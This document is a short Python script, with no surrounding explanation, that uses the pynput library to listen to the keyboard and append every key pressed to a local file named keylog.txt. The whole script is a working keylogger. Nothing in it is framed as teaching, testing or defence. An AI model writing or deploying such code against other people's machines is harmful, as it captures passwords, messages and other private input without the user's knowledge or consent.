from pynput.keyboard import Listener

def log_key(key):
    with open("keylog.txt", "a") as f:
        f.write(f"{key}\n")

with Listener(on_press=log_key) as listener:
    listener.join()
